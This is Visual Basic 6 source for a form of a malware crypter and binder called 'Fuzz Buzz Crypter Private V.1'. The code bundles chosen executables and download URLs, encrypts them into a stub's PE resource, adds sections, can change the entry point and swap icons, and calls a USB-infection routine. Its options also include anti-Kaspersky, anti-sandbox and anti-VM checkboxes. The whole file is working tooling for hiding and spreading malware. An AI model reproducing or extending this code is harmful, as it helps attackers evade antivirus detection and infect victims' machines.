VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H8000000E&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Fuzz Buzz Crypter Private V.1"
   ClientHeight    =   8730
   ClientLeft      =   -15
   ClientTop       =   345
   ClientWidth     =   6510
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":0000
   ScaleHeight     =   8730
   ScaleWidth      =   6510
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command6 
      Caption         =   "About"
      Height          =   375
      Left            =   2880
      TabIndex        =   27
      Top             =   8040
      Width           =   1335
   End
   Begin VB.Frame Frame3 
      BackColor       =   &H8000000E&
      Caption         =   "Anti Options"
      Height          =   975
      Left            =   3600
      TabIndex        =   23
      Top             =   5640
      Width           =   2655
      Begin VB.CheckBox Check6 
         BackColor       =   &H8000000E&
         Caption         =   "Anti Kaspersky"
         Height          =   195
         Left            =   120
         TabIndex        =   26
         Top             =   720
         Width           =   1695
      End
      Begin VB.CheckBox Check5 
         BackColor       =   &H8000000E&
         Caption         =   "Anti Sandbox"
         Height          =   195
         Left            =   120
         TabIndex        =   25
         Top             =   480
         Width           =   1815
      End
      Begin VB.CheckBox Check4 
         BackColor       =   &H8000000E&
         Caption         =   "Anti Vmware / Virtual PC"
         Height          =   195
         Left            =   120
         TabIndex        =   24
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.PictureBox Picture1 
      Height          =   495
      Left            =   5760
      ScaleHeight     =   435
      ScaleWidth      =   435
      TabIndex        =   22
      Top             =   1560
      Width           =   495
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H8000000E&
      Caption         =   "Encryption String"
      Height          =   735
      Left            =   360
      TabIndex        =   17
      Top             =   6840
      Width           =   5895
      Begin VB.TextBox txtkeylaenge 
         Enabled         =   0   'False
         Height          =   285
         Left            =   3360
         TabIndex        =   21
         Text            =   "20"
         Top             =   300
         Width           =   495
      End
      Begin VB.HScrollBar scroll 
         Height          =   255
         Left            =   3960
         TabIndex        =   20
         Top             =   300
         Width           =   375
      End
      Begin VB.CommandButton cmd_generieren 
         Caption         =   "Generate"
         Height          =   255
         Left            =   4560
         TabIndex        =   19
         Top             =   300
         Width           =   1095
      End
      Begin VB.TextBox txtKey 
         Height          =   285
         Left            =   120
         TabIndex        =   18
         Top             =   300
         Width           =   3135
      End
   End
   Begin VB.CheckBox Check14 
      BackColor       =   &H8000000E&
      Caption         =   "USB Spread"
      Height          =   195
      Left            =   480
      TabIndex        =   16
      Top             =   6360
      Width           =   1935
   End
   Begin MSComDlg.CommonDialog DLG3 
      Left            =   5640
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H8000000E&
      Caption         =   "Normal Options"
      Height          =   975
      Left            =   360
      TabIndex        =   13
      Top             =   5640
      Width           =   2295
      Begin VB.CheckBox Check3 
         BackColor       =   &H8000000E&
         Caption         =   "EOF Support"
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   480
         Width           =   1935
      End
      Begin VB.CheckBox Check1 
         BackColor       =   &H8000000E&
         Caption         =   "Change Entrypoint"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   240
         Width           =   1695
      End
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H8000000E&
      Caption         =   "Activate Custom Stub"
      Height          =   195
      Left            =   360
      TabIndex        =   10
      Top             =   4800
      Value           =   2  'Grayed
      Width           =   1935
   End
   Begin MSComDlg.CommonDialog cdl3 
      Left            =   5640
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Browse Stub"
      Height          =   255
      Left            =   4920
      TabIndex        =   9
      Top             =   5040
      Width           =   1335
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   360
      TabIndex        =   8
      Text            =   "Custom Stub..."
      Top             =   5040
      Width           =   4335
   End
   Begin MSComDlg.CommonDialog DLG2 
      Left            =   5640
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Browse Icon "
      Height          =   255
      Left            =   4080
      TabIndex        =   7
      Top             =   1680
      Width           =   1335
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   240
      TabIndex        =   6
      Top             =   1680
      Width           =   3615
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Add URL"
      Height          =   255
      Left            =   4920
      TabIndex        =   5
      Top             =   4320
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   360
      TabIndex        =   4
      Top             =   4320
      Width           =   4335
   End
   Begin VB.ListBox List1 
      Columns         =   1
      Height          =   1035
      ItemData        =   "Form1.frx":1FDE
      Left            =   240
      List            =   "Form1.frx":1FE0
      TabIndex        =   3
      Top             =   2280
      Width           =   6015
   End
   Begin MSComDlg.CommonDialog DLG 
      Left            =   5640
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Crypt"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   4560
      TabIndex        =   1
      Top             =   7920
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Add File"
      Height          =   375
      Left            =   2280
      TabIndex        =   0
      Top             =   3480
      Width           =   1815
   End
   Begin VB.Label Label3 
      BackColor       =   &H8000000E&
      Caption         =   "Files to Crypt and Bind and URLs to download"
      Height          =   255
      Left            =   240
      TabIndex        =   12
      Top             =   2040
      Width           =   3495
   End
   Begin VB.Label Label2 
      BackColor       =   &H8000000E&
      Caption         =   "Change Icon"
      Height          =   255
      Left            =   240
      TabIndex        =   11
      Top             =   1440
      Width           =   1335
   End
   Begin VB.Label Label1 
      BackColor       =   &H8000000E&
      Caption         =   "Add URL (with http://)"
      Height          =   255
      Left            =   360
      TabIndex        =   2
      Top             =   4080
      Width           =   1695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As String, ByVal lpName As String, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Const FileSplit = "()/&@\]["
Private Declare Sub InitCommonControls Lib "comctl32" ()
Dim eofdata As String
Dim Reg As Object
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)
Private Declare Function GetTickCount Lib "kernel32" () As Long
Const Letters1 = "abcdefghijklmnopqrstuvwxyz"
Const Letters2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Const Letters3 = "{[]}\*/-+1234567890,.-;:_'*~#!§$%&/()=?"







Private Sub Check2_Click()
If Check2.Value = 1 Then
Text3.Enabled = True
Command5.Enabled = True
Else
Text3.Enabled = False
Command5.Enabled = False
End If

End Sub


Private Sub cmd_generieren_Click()

Dim zeichen As String
Dim i As Integer
zeichen = ""
zeichen = Letters1 & Letters2 & Letters3



If Not IsNumeric(txtkeylaenge.Text) Then
    MsgBox "Bitte nur numerische Zeichen als Länge angeben!", vbCritical, "Fehler"
    Exit Sub
End If

Dim stringiling As String
stringiling = ""

txtKey.Text = ""

For i = 1 To txtkeylaenge.Text
    Randomize Timer
    Dim start As String
    start = Int((Rnd * Len(zeichen)) + 1)
    stringiling = stringiling & Mid(zeichen, start, 1)
    DoEvents
Next i

txtKey.Text = stringiling

End Sub

Private Sub Command1_Click()
On Error Resume Next
        DLG.CancelError = True
        DLG.DefaultExt = ".exe"
        DLG.DialogTitle = "Open PE File"
        DLG.Filter = "Executables (*.exe)|*.exe"
        DLG.ShowOpen
        
        List1.AddItem (DLG.Filename)
End Sub






Private Sub Command2_Click()
        
        
If List1.ListCount = 0 Then
MsgBox "Please choose a File!", vbInformation, "Info"
Exit Sub
End If
        
        Dim sBuff As String
        Dim sStub As String
        Dim hRes As Long
        Dim c As New Class1
        Dim sTotal As String
        Dim i As Integer
        Dim Err As String
        Dim Stubpath As String
        
        
        With DLG
        On Error Resume Next

        .CancelError = True
        .DefaultExt = ".exe"
       .Filter = "Exe Files (*.exe)|*.exe|Scr Files (*.scr)|*.scr|Com Files (*.com)|*.com|Bat Files (*.bat)|*.bat|Pif Files (*.pif)|*.pif|"
        .Filename = "Crypted.exe"
        .ShowSave
        End With
        
        
        
        
        If Check2.Value = 1 Then
        Stubpath = cdl3.Filename
        Else
        Stubpath = App.Path & "\ew.exe"
        End If
        
        
        Open Stubpath For Binary As #1
        sStub = Space(LOF(1))
        Get #1, , sStub
        Close #1
        
        
        
        
        For i = 0 To List1.ListCount - 1
        
        If Left(List1.List(i), 4) <> "http" Then
            Open List1.List(i) For Binary As #1
            sBuff = Space(LOF(1))
            Get #1, , sBuff
            Close #1
        Else
        sBuff = List1.List(i)
        End If
        
        Open DLG.Filename For Binary As #1
        Put #1, , sStub & FileSplit
        'Put #1, ,
        'put #1, ,
        'put #1, ,
        'put #1, ,

        
        Close #1
        
        sTotal = sTotal & sBuff & FileSplit
        Next i
                        
                        
                        

        sTotal = c.EncryptString(sTotal, "passwordhere", False)
        hRes = BeginUpdateResource(DLG.Filename, False) 'here we start by telling the output file that were updating his resources and not to delete the resources it may already have
        Call UpdateResource(hRes, "53738", 500, 0, ByVal sTotal, Len(sTotal)) 'the actual updating of the resources. it adds the sFile string as resource CUSTOM 101 to the output file.
        Call EndUpdateResource(hRes, False) 'end the updating of the resource
        

        
        Call AddSection(DLG.Filename, ".548", "1", &H60000020)
        Call RealignPEFromFile(DLG.Filename)
        Call AddSection(DLG.Filename, ".ezt", "1", &H60000020)

      
      
      
      
      '''''' Extras
       If Text2 <> "" Then
       Call ReplaceIcons(Text2.Text, DLG.Filename, vbNullString)
       End If
       If Check1.Value = 1 Then
       Call ChangeOEPFromFile(DLG.Filename)
       End If
       If Check3.Value = 1 Then
        pathEOF (DLG.Filename)
       End If
               If Check14.Value = 1 Then
        INFECT_USB App.Path, App.EXEName & ".exe"
        End If


       ''''''''
       
       
       
 MsgBox "Done"
 
End Sub

Private Sub Command3_Click()
List1.AddItem (Text1)
End Sub

Private Sub Command4_Click()

        With DLG2
        .CancelError = False
        .DefaultExt = ".ico"
        .Filter = "ICO Files (*.ico)|*.ico"
        .ShowOpen
            Picture1.Picture = LoadPicture(DLG2.Filename, , , 32, 32)

        End With
        Text2.Text = DLG2.Filename

End Sub



Private Sub Command5_Click()
cdl3.CancelError = False
cdl3.DialogTitle = "Open Custom Stub"
cdl3.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
cdl3.ShowOpen
Text3.Text = cdl3.Filename


End Sub




Private Sub File1_Click()

End Sub


Private Sub Command6_Click()
MsgBox " Fuzz Buzz BCD coded by Ch0pPeR", vbInformation, "Info"
End Sub

Private Sub Form_Load()
   
cmd_generieren_Click
End Sub


Private Sub Form_Initialize()
  
  ' InitCommonControls
 '  DoTheTrick
   Check2.Value = 0
End Sub



Private Sub scroll_Change()
txtkeylaenge.Text = CStr(scroll.Value)
If txtkeylaenge.Text = 27 Then scroll.Value = 1

End Sub
